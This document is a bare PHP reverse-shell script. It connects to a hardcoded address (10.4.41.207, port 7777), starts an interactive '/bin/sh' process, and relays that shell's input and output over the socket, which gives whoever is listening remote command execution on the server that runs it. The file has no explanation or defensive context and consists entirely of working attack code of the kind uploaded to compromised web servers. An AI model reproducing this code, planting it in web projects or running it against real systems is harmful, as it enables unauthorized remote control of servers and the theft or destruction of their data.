<?php

$ip = '10.4.41.207';
$port = 7777;
$cmd = '/bin/sh -i';
$buffer = 2000;

chdir("/");
umask(0);

$sock = fsockopen($ip, $port, $error_code, $error_message, 100);

$descriptor_spec = array(
    0 => array("pipe", "r"), 
    1 => array("pipe", "w"),  
    2 => array("pipe", "w")   
);

$process = proc_open($cmd, $descriptor_spec, $pipes);

stream_set_blocking($sock, 0);
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);

while (1) {
    $read_array = array($sock, $pipes[1], $pipes[2]);

    if (in_array($sock, $read_array)) {
        $input = fread($sock, $buffer);
        fwrite($pipes[0], $input);
    }

    if (in_array($pipes[1], $read_array)) {
        $output = fread($pipes[1], $buffer);
        fwrite($sock, $output);
    }

    if (in_array($pipes[2], $read_array)) {
        $error = fread($pipes[2], $buffer);
        fwrite($sock, $error);
    }

    if (feof($sock)){
        break;
    }

    if (feof($pipes[1])) {
        break;
    }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

?>
